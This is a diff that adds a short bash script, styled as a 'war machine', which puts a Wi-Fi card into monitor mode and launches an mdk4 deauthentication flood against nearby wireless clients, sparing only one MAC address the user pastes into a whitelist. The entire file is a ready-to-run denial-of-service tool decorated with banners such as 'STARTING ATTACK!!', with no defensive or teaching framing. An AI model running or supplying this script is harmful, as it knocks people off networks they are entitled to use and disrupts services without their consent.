@@ -1,0 +1,27 @@
+printf %b '\e]11;#003300\a'
+clear
+sudo rm -rv ~/whitelist.txt
+sudo airmon-ng stop mon7
+clear
+echo "We Are Ready To Kick Them, Sir!" | lolcat
+sleep 5
+ifconfig | lolcat
+read -p " Choose Your Wifi :" wificr
+read -p " Copy And Paste ETHER :" ether
+echo $ether >> ~/whitelist.txt
+sleep 3
+echo "STARTING WAR-MACHINE..." | lolcat -a -d 100
+sudo iw $wificr interface add mon7 type monitor
+echo "--------- OK.."
+echo "--------- W-M STARTED"
+echo "STARTING ATTACK!!" | lolcat
+sleep 3
+clear
+printf %b '\e]11;#000000\a'
+figlet "ATTACKING . . ." | lolcat -a -d 7
+echo ""
+cowsay "CTRL - C  to STOP" | lolcat
+{
+sudo mdk4 mon7 d -w ~/whitelist.txt
+} &> /dev/null
+
